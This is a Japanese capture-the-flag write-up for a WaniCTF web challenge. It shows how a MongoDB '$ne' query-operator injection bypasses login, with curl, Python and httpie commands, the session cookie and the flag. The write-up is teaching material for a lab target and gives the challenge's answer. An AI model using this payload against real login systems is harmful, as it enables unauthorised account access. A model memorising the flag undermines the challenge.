---
title: "NoSQL"
level: 3
flag: "FLAG{n0_sql_1nj3ction}"
writer: "suuhito"
badge: true
---

# NoSQL

## 問題文
NoSQLを使ったサイトを作ってみました。ログイン後に`/`にアクセスすると秘密のページを見ることができます。

<https://nosql.web.wanictf.org/>

## フラグ

`FLAG{n0_sql_1nj3ction}`

## 解法
* `app/routes/login.js`を見ると、MongoDBを使ったユーザ認証が行われていることがわかります。
* `app/routes/login.js`の19行目から、ユーザから送信された`username`と`password`を利用してDBからユーザを取得し、もしユーザが存在するならログインが成功するという処理が行われています。
* `username`や`password`はユーザから送信されたデータそのままが利用されています。そのため、送信するデータを工夫することで[MongoDBのQuery Operator](https://docs.mongodb.com/manual/tutorial/query-documents/#specify-conditions-using-query-operators)を使用することができる可能性があります。
* [Query Operatorの種類](https://docs.mongodb.com/manual/reference/operator/query/)を確認すると、`$ne`(not equal)があります。これを利用して、`username`が""(空文字)ではない人で取得すれば、確実にユーザは存在し、不正にログインすることができそうです。
* `Query Operator`を使用するためには`username`に文字列ではなく`Object`を送信する必要があります。そのためにはJSON形式を利用するのが簡単ですが、`app/app.js`の20行目を見るとこのサーバはJSON形式を受け入れるようになっているため、攻撃できそうだとわかります。
* 試しに`{"username": {"$ne": ""}, "password": {"$ne": ""}}`のようなJSONを送信してみると、以下のように表示されます。
```sh
$ curl -X POST https://nosql.web.wanictf.org/login -H "Content-Type: application/json" -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}'
Found. Redirecting to /
```
* これは`app/routes/login.js`の28行目の`res.redirect("/");`が動作したことを意味しているため、ログインに成功したことが分かります！
* `/`にアクセスしなければ秘密のページ(FLAG)は見れません。しかしcurlで`/`にアクセスするだけではログインページに飛ばされてしまいます。
```sh
$ curl https://nosql.web.wanictf.org/
Found. Redirecting to /login
```
* ログインできたはずなのに、ログインできていないように見えるのは、サーバがログイン状態を認識するために使っている情報を送信できていないことが原因です。先ほどのログインに成功したコマンドにレスポンスヘッダをすべて表示するオプション`-i`を付けてみます。
```sh
$ curl -X POST https://nosql.web.wanictf.org/login -H "Content-Type: application/json" -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}' -i
HTTP/2 302
content-type: text/plain; charset=utf-8
date: Sun, 07 Nov 2021 07:47:11 GMT
location: /
set-cookie: connect.sid=s%3Au1ek_W7S_UEwInihas5l7ePcv2ZZbTvZ.m4IeSOS3Pb5hFjclrB%2B1g%2FUnd6NQu7oBI9qDo4lsreE; Path=/; HttpOnly
vary: Accept
x-powered-by: Express
content-length: 23

Found. Redirecting to /
```
* サーバはクライアントに対して`set-cookie`ヘッダを利用して「あなたのログイン状態を認識するためにこの値を送信してください」と伝えてくれています。よって`/`にアクセスする際にこの値をヘッダにつけてアクセスします。
```
$ curl https://nosql.web.wanictf.org/ -H "cookie: connect.sid=s%3Au1ek_W7S_UEwInihas5l7ePcv2ZZbTvZ.m4IeSOS3Pb5hFjclrB%2B1g%2FUnd6NQu7oBI9qDo4lsreE; Path=/; HttpOnly"
<!DOCTYPE html>
<html>
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css"
      integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
  </head>

  <body>
    <nav class="navbar navbar-expand-sm navbar-light bg-light">
      <a class="navbar-brand" href="/">NoSQL Challenge</a>
      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
      </button>
      <div class="collapse navbar-collapse" id="navbarSupportedContent">
        <ul class="navbar-nav ml-auto">
          <li class="nav-item">

              <a class="nav-link" href="/logout">ログアウト</a>

          </li>
        </ul>
      </div>
    </nav>
    <div class="container">

      FLAG{n0_sql_1nj3ction}
    </div>
    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"
      integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj"
      crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"
      integrity="sha384-ho+j7jyWK8fNQe+A12Hb8AhRq26LrZ/JpcUGGOn+Y7RsweNrtN/tE3MoK7ZeZDyx"
      crossorigin="anonymous"></script>
  </body>
</html>
```
* 無事FLAGを入手できました！
* 実は`requests`はデフォルトでリダイレクトを処理するため、`requests`で解くとcookieで惑わされたりしません。また、`httpie`にも`--follow`オプションがあります。
```python
import requests
print(requests.post("https://nosql.web.wanictf.org/login", json={"username": {"$ne": ""}, "password": {"$ne": ""}}).text)
```
```sh
# httpie
http post https://nosql.web.wanictf.org/login username:='{"$ne": ""}' password:='{"$ne": ""}' --follow
```